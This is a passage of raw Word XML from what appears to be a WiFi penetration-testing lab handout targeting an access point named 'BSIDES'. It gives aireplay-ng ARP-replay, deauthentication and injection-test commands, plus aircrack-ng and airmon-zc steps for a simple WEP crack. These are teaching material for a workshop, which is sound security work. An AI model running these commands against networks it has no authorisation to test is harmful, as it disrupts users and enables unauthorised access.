          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A0CE0E6" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="009D5939" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>In Console 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1CB6DE" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arpreplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –e BSIDES wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A017EC" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13C29832" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="009D5939" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>In Console 3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B557960" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="OLE_LINK1"/>
      <w:bookmarkStart w:id="2" w:name="OLE_LINK2"/>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>deauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0 –e BSIDES –h </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>client_mac</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="091E2F18" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Ctr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-C</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="1"/>
    <w:bookmarkEnd w:id="2"/>
    <w:p w14:paraId="66016FAD" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60263662" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="009D5939" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>In Console 4:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35013514" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> channel1.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5E1430" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="563939B2" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>Simple WEP Crack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C674DB5" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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Step 1 - Start the wireless interface in monitor mode on AP channel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521D161C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40E605AA"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Enter the following command to start the wireless card on channel 9 in monitor mode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53742E43" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B1FA293" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00540687" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airmon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan0 9  </w:t>
      </w:r>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0DF"/>
      </w:r>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>channel 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77AC99E5" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="739DDE00" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00EC3B33" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC3B33">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 2 - Test Wireless Device Packet Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5A9E31" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00EC3B33" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC3B33">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>The purpose of this step ensures that your card is within distance of your AP and can inject packets to it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="517363F0" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="006B3EAA" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52CDD97C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="006B3EAA" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B3EAA">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E1D4815" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="006B3EAA" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="046325E6" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="0012143E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -9 -e BSIDES -a 00:14:6C:7E:40:80  wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB19AFB" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="0012143E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A937264" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="0012143E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45982CB0" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="0012143E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-9 means injection test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F724EA" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="0012143E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
